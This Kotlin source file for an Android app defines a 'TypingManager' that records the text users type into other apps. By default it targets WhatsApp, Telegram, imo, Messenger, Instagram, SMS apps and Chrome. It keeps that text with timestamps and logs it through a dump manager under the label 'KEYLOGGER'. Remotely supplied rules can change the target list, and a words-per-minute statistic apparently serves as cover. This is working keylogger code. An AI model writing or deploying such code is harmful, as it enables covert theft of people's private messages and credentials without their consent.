package com.example.myandroid

import android.content.Context
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject

object TypingManager {
    private var lastPkg = ""
    private var lastTs = 0L
    private var startTs = 0L
    
    fun onType(ctx: Context, pkg: String, text: String) {
        if (!ConfigManager.canCollect(ctx, "typing")) return
        if (text.isBlank()) return
        
        // OFF-LOAD TO BACKGROUND: Prevents Main Thread block and ANRs
        CoroutineScope(Dispatchers.IO).launch {
            val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
            
            val rulesStr = prefs.getString("cached_rules", "{}")
            val isTarget = try {
                val json = JSONObject(rulesStr!!)
                if (json.length() > 0) json.has(pkg) else getDefaultTargets().contains(pkg)
            } catch (e: Exception) {
                getDefaultTargets().contains(pkg)
            }
            if (!isTarget) return@launch
            
            val now = System.currentTimeMillis()
            val historyStr = prefs.getString("typing_history", "[]")
            val history = try { JSONArray(historyStr) } catch(e: Exception) { JSONArray() }
            
            val isContinuation = (pkg == lastPkg && (now - lastTs) < 3000)
            val entry: JSONObject

            if (isContinuation && history.length() > 0) {
                entry = history.getJSONObject(history.length() - 1)
                entry.put("txt", text)
                entry.put("end_ts", now)
                
                val burstDurationSec = (now - startTs) / 1000f
                if (burstDurationSec > 1) {
                    val wpm = (text.length / 5f) / (burstDurationSec / 60f)
                    entry.put("wpm", wpm.toInt())
                }
                history.put(history.length() - 1, entry)
            } else {
                startTs = now
                entry = JSONObject()
                entry.put("pkg", pkg)
                entry.put("txt", text)
                entry.put("start_ts", now)
                entry.put("end_ts", now)
                entry.put("wpm", 0)
                history.put(entry)
            }

            DumpManager.appendLog("KEY", entry)
            DumpManager.logVerification("KEYLOGGER", pkg)
            
            if (history.length() > 100) history.remove(0)
            // USE COMMIT() IN IO THREAD: Bypasses Android's queued work pause block
            prefs.edit().putString("typing_history", history.toString()).commit()
            
            lastPkg = pkg
            lastTs = now
        }
    }

    fun getStats(ctx: Context): JSONObject {
        val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        val raw = prefs.getString("typing_history", "[]")
        val history = try { JSONArray(raw) } catch(e: Exception) { JSONArray() }
        
        var totalChars = 0
        var totalWpm = 0
        var validCount = 0
        
        for (i in 0 until history.length()) {
            val item = history.getJSONObject(i)
            totalChars += item.optString("txt").length
            val wpm = item.optInt("wpm")
            if (wpm > 0 && wpm < 200) {
                totalWpm += wpm
                validCount++
            }
        }
        
        val avg = if (validCount > 0) totalWpm / validCount else 0
        
        val stats = JSONObject()
        stats.put("total_chars", totalChars)
        stats.put("avg_wpm", avg)
        return stats
    }

    private fun getDefaultTargets(): Set<String> {
        return setOf(
            "com.imo.android.imoim", "com.imo.android.imoimlite", "com.imo.android.imoimbeta", "com.imo.android.imoimhd",
            "com.google.android.apps.messaging", "com.samsung.android.messaging",
            "com.whatsapp", "org.telegram.messenger", "org.telegram.plus",
            "com.truecaller", "com.android.chrome", "com.facebook.orca", "com.instagram.android"
        )
    }
}
